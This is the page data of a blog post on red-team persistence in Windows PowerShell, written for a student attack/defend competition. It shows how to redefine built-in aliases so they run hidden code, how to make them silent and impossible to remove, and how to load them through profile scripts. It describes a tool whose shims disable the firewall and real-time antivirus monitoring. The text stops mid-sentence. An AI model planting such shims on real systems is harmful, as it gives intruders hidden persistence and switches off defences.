{"componentChunkName":"component---node-modules-narative-gatsby-theme-novela-src-templates-article-template-tsx","path":"/Using-and-Abusing-Aliases-with-PowerShell","result":{"data":{"allSite":{"edges":[{"node":{"siteMetadata":{"name":"SecBytes"}}}]}},"pageContext":{"article":{"id":"31f00fd2-fe08-554a-8fb0-8e5e4bca4201","slug":"/Using-and-Abusing-Aliases-with-PowerShell","secret":false,"title":"Using and Abusing Aliases with PowerShell","author":"NotoriousRebel","date":"November 24th, 2019","dateForSEO":"2019-11-24T00:00:00.000Z","timeToRead":5,"excerpt":"Shimming Aliases with PowerShell","subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Using and Abusing Aliases with PowerShell\",\n  \"author\": \"NotoriousRebel\",\n  \"date\": \"2019-11-24T00:00:00.000Z\",\n  \"hero\": \"./images/Treasure.jpg\",\n  \"excerpt\": \"Shimming Aliases with PowerShell\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"h3\", {\n    \"id\": \"introduction\"\n  }, \"Introduction\"), mdx(\"p\", null, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LOLBAS\"), \"\\nIn preparation for another \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://lockdown.ubnetdef.org/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"UB Lockdown\"), \", I had a goal in mind,\\nwork on a new tool for Windows Persistence. It\\u2019s good to thoroughly understand\\nother developers tools that have been made such as\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/outflanknl/SharpHide/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"SharpHide\"), \"\\nor\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/fireeye/SharPersist\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"SharPerist\"), \". However, I wanted to create something\\nfrom scratch and do something different. The problem I faced was that it\\u2019s hard to be unique\\nand create something from scratch when a lot of tools already exist that accomplish your vision. Luckily, I had an idea because when red teaming for Linux one technique for persistence is shimming aliases through .bashrc\\nor .bash_aliases. However, I could not find any tools or much research in regards to using aliases for red teaming Windows. Thus began my journey!\"), mdx(\"h3\", {\n    \"id\": \"understanding-aliases\"\n  }, \"Understanding Aliases\"), mdx(\"p\", null, \"With Powershell becoming more and more prevalent for both red teamers\\nand blue teamers I focused my research into Powershell aliases instead of Command Prompt aliases. By simply doing\\nGet-Alias in Powershell you will see that a lot of things are aliased, some of the most useful and surprising ones are cat, clear, cp, iex, iwr, and ls. This is only a small snippet out of the 158 built-in aliases with Powershell version 5.\\nMicrosoft defines an alias as: \\u201Can alternate name or nickname for a cmdlet or for a command element, such as a function, script, file, or executable file. You can use the alias instead of the command name in any PowerShell commands.\\u201D\"), mdx(\"h3\", {\n    \"id\": \"basic-shimming-with-one-alias\"\n  }, \"Basic Shimming with one Alias\"), mdx(\"p\", null, \"Now that we understand what an Alias is and just how prevalent they are\\nin Powershell now it\\u2019s time to shim one. Let\\u2019s shim the alias ls as it is fairly common. First let\\u2019s see what the ls alias is defined as, to do that we simply type \", mdx(\"br\", null)), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"(Get-Alias -Name ls).Definition\\n\")), mdx(\"p\", null, \"This returns Get-ChildItem which is what ls is aliased to.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1234px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"70.42139384116695%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAABJ0AAASdAHeZh94AAAB/0lEQVQoz52R20/TUBzHf4Nt4NSgkQgbBEa77uYgxEuCE6U6oy+ohLCt7MK8zA224QV5MSb64rv6oA/qX2eiiY512MLatT2n/tot8WGAiSffnH5P+/v0dznw42f92/dGq/m7vSvJoiw3ZaVZV5o7hiqZ+j7V9lBdo+/Zx+5L0pZBa6uSRMSGLomaKOqNX3RX1HfqqrJPFdVoK1RVSaulo9EUU1WIphPTXpRSUFWFmiahFNXdqH0kVDeIYVCD4G6bjgjpBOuGAdTQzP9dsPX2a/nVp9qbz6WXH3Nb7wrb79deWCpsf0B/hCqvv8CpmRxMrcDEsoNNO4MCeO+C7x6MLcHZRRi5A6OHaGTRigwlaq6QcObCA//CxtS16smZ/InpfODGpneuOBBe7ecE/GOv+oPCYDQDk/NlYJJ+vsolnoxfWUfSFVoN3nwaufUMYWCTjkCqVxBIYUoYu1x0hgRPLD8YzR47l/XEcp5YdiCScYWFPi59IPkX9l8tD1965IuXhy8+xJqRxHqwqsNydmE25cK6xuNFfDiD6ePT+aHZAn5A0h3JONgkRvwDDlyvYM/eeIlLbDJ81U6ei95+zvK1o3ruwCy/gXl88dLE/Pro3GMkcQSTCxWGr1k3x6yAVUKPmCSGWfDp8/eHZtfc1sWkcQwd08el0BwoHKc7nME2/wBcPGjQqG8a3wAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/020cda62d41a8bf50ea82c8709683492/c2bb4/basic.webp 1234w\"],\n    \"sizes\": \"(max-width: 1234px) 100vw, 1234px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/020cda62d41a8bf50ea82c8709683492/597b7/basic.png 1234w\"],\n    \"sizes\": \"(max-width: 1234px) 100vw, 1234px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/020cda62d41a8bf50ea82c8709683492/597b7/basic.png\",\n    \"alt\": \"Automate\",\n    \"title\": \"Automate\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"As we can see here the alias for ls has been redefined to:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"{Get-ChildItem; hello_world}\\n\")), mdx(\"p\", null, \"hello_world being our function that simply prints Hello World!\"), mdx(\"p\", null, \"Let\\u2019s break down what we are actually doing:\"), mdx(\"p\", null, \"hello_world function simply prints Hello World!\\nshimmed_ls is the name of the function we are going to realias ls to\\nthis function simply does Get-ChildItem which is what ls was originally mapped to.\\nNow it is realiased to Get-ChildItem; hello_world\"), mdx(\"p\", null, \"Lastly, let\\u2019s break the command that sets the alias.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"Set-Alias -Name ls -Value shimmed_ls -Option AllScope -Scope Global -ErrorAction SilentlyContinue -Force\\n\")), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Name ls\"), \": Name of our alias we are realiasing\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Value shimmed_ls\"), \": What we are realiasing ls to\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Option AllScope\"), \": Alias is copied to any new scopes that are created\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Scope Global\"), \": Scope in which alias is valid. Global means scope is in effect when PowerShell starts.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"ErrorAction\"), \": If an error should occur for whatever reason it will not error display an error message user as that may alert the user, rather just silently continue.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Force\"), \": This is required as the majority of built-in PowerShell aliases are ReadOnly which means they cannot be changed or deleted unless the Force parameter is used. To see which aliases are ReadOnly do: \"))), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"Get-Alias | Where-Object {$_.Options -Match \\\"ReadOnly\\\"}\\n\")), mdx(\"h3\", {\n    \"id\": \"basic-removal-of-the-shim\"\n  }, \"Basic Removal of the Shim\"), mdx(\"p\", null, \"Now that we have remapped an alias, you\\u2019re probably\\nwondering how do I remove it?\"), mdx(\"p\", null, \"The answer is simple as we can just do:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"Remove-Alias -Name ls -Force\\nOr\\nRemove-Item alias:ls -Force\\n\")), mdx(\"p\", null, \"That works just fine as ls is no longer aliased our shim no longer works.\"), mdx(\"br\", null), mdx(\"p\", null, \"However, we can fix that :)\"), mdx(\"br\", null), mdx(\"p\", null, \"Now when you do Set-Alias instead of  \", mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"-Option AllScope\"), \" do\\n\", mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"-Option AllScope, Constant\")), mdx(\"p\", null, \"Let\\u2019s try deleting it now, we will even run PowerShell as an administrator\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1255px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"52.430278884462155%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAABJ0AAASdAHeZh94AAABwElEQVQoz53Qy2sTQRwH8LEFEUqt0DwPBa2xqZtXKTSR3jwoVvFQSl7dKNjEm2Bt6d3/0YOnmuaxyXZ3Z5/ZzTx3nPUg4kn88mGY7wy/OQz4PprNdHMyhzdTfapD20fekrphwgmZs8B+xNyQuAviL/lvgYQ4uB6Ov11rs1sXWtataVuWDR3DNHXTgjp0TNNwHNuwZKAXLLwg8PyE6weW7QHH80xrCfUotBA0sG1Qz/BdI6CICMY4o5zQmFJGSCw3hHJKOSNC8CgMQBSFjAmMYoI5xpygGOMYyYpiSmJMOMExIfKKyUqJkI/IcSGEHyTDkfg7sfiH+L4PEFqK/wpCCAxHk/F0PtF0uY41SZ9oss5/jDVp+MvNH4ajqSZ/0/ZM6ILD46vyq/Pam8vSy/Pq0Zfa6wtZC88/5Rr93LNBvjHINvqbB/3UQT9dT2Tq8vxjpj548e4rUA7Pinu9wl4vX+qmle6D3c5Gsb2200o2u21pvdi+W2jdK7RWHzdXtpvg4cmdRydg67h69Blk6x9SFXVr//26cnpf6aYr6mbpNF1WMxU1VU5kq2q+2svVehtKd+1pZ+VJe3WnA7ab+28vfwJAlrjM0vN6CAAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/00e58dcd33a1beaa463d48a8837577ee/aecae/removeme.webp 1255w\"],\n    \"sizes\": \"(max-width: 1255px) 100vw, 1255px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/00e58dcd33a1beaa463d48a8837577ee/d90ba/removeme.png 1255w\"],\n    \"sizes\": \"(max-width: 1255px) 100vw, 1255px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/00e58dcd33a1beaa463d48a8837577ee/d90ba/removeme.png\",\n    \"alt\": \"RemoveMe\",\n    \"title\": \"RemoveMe\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"PowerShell now throws an error as the alias is a constant!\"), mdx(\"h3\", {\n    \"id\": \"taking-it-one-step-further\"\n  }, \"Taking it one Step Further\"), mdx(\"p\", null, \"Now that we have learned how to realias aliases to our shimmed version\\nwouldn\\u2019t it be nice to just cut out the middle man. Instead of relaliasing aliases\\nlet\\u2019s just redefine what the alias is defined as!\"), mdx(\"p\", null, \"Back to our favorite example with ls\\nwe saw that it was aliased to Get-ChildItem so lets try redefining\\nwhat Get-ChildItem is:\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1077px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"70.93779015784587%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAABJ0AAASdAHeZh94AAABvElEQVQoz52RyU/CQBTGB3ENrgjiEhQCosiOqGhwuRmjhINiRSkiyGY8aCLhb/XgTYUKbay0FCy0vsrFQOjB5pf2vZl+830zg0pl6vml9PpG1T+rLPlJV5gq9cWRJY4ieParWa/yHMBAIXwzHSC+ydfrTZbhYZZjWjQt0LTIVJu1WqPBCY2ayLECw4o1ThBEsQMktFrifx9UJCrFD5KoUJD/nSCLBEmUpRp4LZYlSpU2b10gbyhvPXxwB/OO4yfb0eN6qOAJ5r2hguskbzy4n9/OzGze9gIZ9nILO5m57bTaewPMbqXU6zfTvoTGl1QuY8h4hgynPdEHMrqt1Kw/NemJD6xeIFO4bxnrM5+334p20QM04Y6pHDgw5sSnPPExB64whX81klIetLCTlv4zhQdXIxpfYsJ9DeawlmYj2b8iBZETq71x9Kscd8VGbFGVHYdRpQUbdUKW2JD1Epl6i+f8t/AZd10b9u/gkHSbUjtojegD2cVATmWPypgjrS8B06MuXL+bg9jajSSMDtuudP4U3MLI2pWcGGIrzJjScgEJAcjfPi2oVY4otHKxl3azYAKGsFsw+evT0XbzAzYNVl0qw/B6AAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e549a724c271a943c658d842798ef103/e87cb/advanced.webp 1077w\"],\n    \"sizes\": \"(max-width: 1077px) 100vw, 1077px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e549a724c271a943c658d842798ef103/6977f/advanced.png 1077w\"],\n    \"sizes\": \"(max-width: 1077px) 100vw, 1077px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/e549a724c271a943c658d842798ef103/6977f/advanced.png\",\n    \"alt\": \"Advanced\",\n    \"title\": \"Advanced\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"Get-ChildItem has been redefined to spawn a powershell session that simply calls Get-ChildItem. PowerShell is called with the flag -nop short for NoProfile as to not load profiles.\"), mdx(\"h3\", {\n    \"id\": \"powershell-profiles-to-the-rescue\"\n  }, \"PowerShell Profiles to the Rescue\"), mdx(\"p\", null, \"There is one big problem with aliasing, our shimmed aliases\\nonly exist within the current PowerShell session.\\nThat means when a user opens up a new PowerShell session all our hard work\\nis lost. Luckily, PowerShell profiles exist, a profile is a PowerShell script that runs whenever the user opens up PowerShell. Profiles are documented in the MITRE attack\\nframework as\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://attack.mitre.org/techniques/T1504/%22\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"T1504\"), \"\\n. What this means for us is that we need to create that special profile called profile.ps1 that will load our malicious shims whenever a user opens up PowerShell.\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"The Four Different Locations of Powershell Profiles\"), \":\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"574px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"60.97560975609756%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAABJ0AAASdAHeZh94AAABDklEQVQoz6VR2XLDMAjU/39kj9ROM9OJJSSh23ZWoumkbdqX7NgYgdjFoIzRz08vh9dDznnf923bYHNOb9Mk/j9QMUa9LEQUYqi1SgEcrXXsSCkmif+Gyrk4SxyYyOKqULbWQKeNFkhTd5RLKd77GAMeaymnXl9bJQvAOPZMBlQkZ+vsVyOq5MKM4hQGkBBlOYKXmVOM/RMCd8u3bWdjBqN3GF4S5VoNGW0WRKR/Mh1wluV8Pn+A/bNt55xnLzpQQmJdV+4ybij1OFRH0reebte2UWxHMQewoIV1bQjOx3masK8ZOA7//XTChf1mf+ruGMFaOipe/BdMyUnG8W3acrWvd7s6f+NHVu0P4KHiC9Z1vXZjtE7XAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b9b4cdd50d526ae8b131bc942f61d429/723c8/profile_locations_pshome.webp 574w\"],\n    \"sizes\": \"(max-width: 574px) 100vw, 574px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b9b4cdd50d526ae8b131bc942f61d429/bf737/profile_locations_pshome.png 574w\"],\n    \"sizes\": \"(max-width: 574px) 100vw, 574px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/b9b4cdd50d526ae8b131bc942f61d429/bf737/profile_locations_pshome.png\",\n    \"alt\": \"Profile_Locations\",\n    \"title\": \"Profile_Locations\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"$PSHOME = C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\")), mdx(\"br\", null), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"$HOME = C:\\\\Users\", \"[\", \"User]\")), mdx(\"h4\", {\n    \"id\": \"you-can-also-do\"\n  }, \"You can also do\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"587px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"46.33730834752981%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABJ0AAASdAHeZh94AAABCklEQVQoz31S7Y6EIAz0/V/yzn+uIAoFv7XXabbmzHrXZAIpZTpDqcaxcF3X/P1V8ziO/DvO89TVe8etc1fuP1TbtvEwDNz3gxLO88zTNDHyRphz5s77K3ccx4VHQlwwpESCxMuyXEpLKexE4bqu/BQfhCAAQEhEHGNSpaYQubZtxUUv9r3sX9x1Hb+aRu8gTG2177taBWAVakCGvBEiH2PUM8DcYG91N4WkNomzFKQUlcC6qmW5DGVwEeW9g6gLIXCi9GwZlqwzZfoklLMQOo7SbBDbeBIMkqTB41CI0tsGKbm9341QVJlCI0T+j2/TazG+TsnlZkOHImeNDAA28X288zJ1fzW0OsQP11u9bi/oc70AAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/f9304adc0e9e1ccc157471317e947f9c/d84e9/profile_locations_profile.webp 587w\"],\n    \"sizes\": \"(max-width: 587px) 100vw, 587px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/f9304adc0e9e1ccc157471317e947f9c/3a024/profile_locations_profile.png 587w\"],\n    \"sizes\": \"(max-width: 587px) 100vw, 587px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/f9304adc0e9e1ccc157471317e947f9c/3a024/profile_locations_profile.png\",\n    \"alt\": \"Profile_Locations\",\n    \"title\": \"Profile_Locations\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"The two we are focusing on are:\"), mdx(\"h3\", {\n    \"id\": \"profilecurrentuserallhosts-and-profilealluserallhosts\"\n  }, \"$PROFILE.CurrentUserAllHosts\", mdx(\"strong\", {\n    parentName: \"h3\"\n  }, \" and \"), \"$PROFILE.AllUserAllHosts\"), mdx(\"br\", null), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"$PROFILE.CurrentUserAllHosts = C:\\\\Users\", \"\\\\\", \"[User]\", \"\\\\Documents\\\\WindowsPowerShell\\\\profile.ps1\")), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"$PROFILE.AllUserAllHosts = C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\profile.ps1\")), mdx(\"p\", null, \"To write to the latter of the two we need to have administrative permissions\\non the box. An interesting tidbit to note is that when PowerShell first runs it will check if the profile for all users has been created and if that doesn\\u2019t exist it will use the profile for the current user if it exists.\"), mdx(\"p\", null, \"Keep in mind PowerShell Profiles do not exist by default, you will have to create those files.\"), mdx(\"h3\", {\n    \"id\": \"putting-all-the-pieces-together\"\n  }, \"Putting All the Pieces Together\"), mdx(\"p\", null, \"With so many aliases in PowerShell and having to create the PowerShell Profiles, it could seem daunting to do this manually. Luckily you don\\u2019t have to as I created a simple PowerShell script called Remapper which does all of the hard work for you! The only thing you may wish to modify are the functions in the first lines of the script. These funcions are what will be called when an alias is run.\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"What the script does:\")), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Get paths of profiles and create them if they don\\u2019t exist\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Create a dictionary mapping aliases to shimmed definitions for the majority of aliases.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Puts the code to rewrite every alias into both PowerShell profiles.\"))), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Our shimmed function does four things\"), \":\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Do what the alias is originally meant for\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Start a job to restore firewall to default settings\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Start a job to turn off real-time monitoring\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Check if google\", \".\", \"com is in the hosts file, if not will add it because during competitions we don\\u2019t blue teamers using Google ;).\"))), mdx(\"p\", null, \"Let\\u2019s run the script as an administrator and see what happens!\"), mdx(\"p\", null, mdx(\"img\", _extends({\n    parentName: \"p\"\n  }, {\n    \"src\": \"/076d38417289bf32775eb32887a02362/demo.gif\",\n    \"alt\": \"Demo\"\n  }))), mdx(\"p\", null, \"As can be 